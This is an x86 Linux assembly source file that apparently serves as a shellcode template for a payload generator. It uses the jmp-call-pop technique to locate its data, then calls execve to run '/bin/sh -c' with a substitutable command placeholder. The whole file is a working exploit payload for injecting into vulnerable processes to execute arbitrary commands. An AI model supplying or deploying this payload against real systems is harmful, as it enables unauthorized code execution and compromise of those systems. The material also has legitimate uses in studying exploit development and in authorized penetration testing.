; execve("/bin//sh", ["sh", "-c", "$CMD$"], [NULL]), contains nulls, 42+cmdlen bytes
BITS 32
jmp push_pc

_start:
pop ebx ; address of bin
; setup args
xor eax, eax
push eax

mov edx, esp ; envp

lea ecx, [ebx+cmd_pos] ; argv[2] = "$CMD$"
push ecx

lea ecx, [ebx+arg1_pos] ; argv[1] = "-c"
push ecx

lea ecx, [ebx+5]       ; argv[0] = "sh"
push ecx

mov ecx, esp ; argv
mov al, 11 ; execve
int 0x80

push_pc:
call _start

bin: db "/bin/sh", 0
arg1_pos equ $-bin
arg1: db "-c", 0
cmd_pos equ $-bin
cmd: db "$CMD$", 0
